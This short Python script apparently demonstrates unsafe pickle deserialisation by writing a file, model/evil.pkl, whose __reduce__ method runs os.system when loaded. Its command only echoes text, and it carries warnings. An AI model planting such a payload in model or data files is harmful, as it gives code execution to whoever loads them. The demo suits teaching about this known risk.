"""Demo of unsafe deserialisation: loading this pickle would run a shell command.
The payload only echoes text. Never load untrusted pickles."""
import os, pickle


class Evil:
    def __reduce__(self):
        return (os.system, ("echo pwned-by-pickle",))


os.makedirs("model", exist_ok=True)
pickle.dump(Evil(), open("model/evil.pkl", "wb"))
print("wrote model/evil.pkl (do NOT load it)")
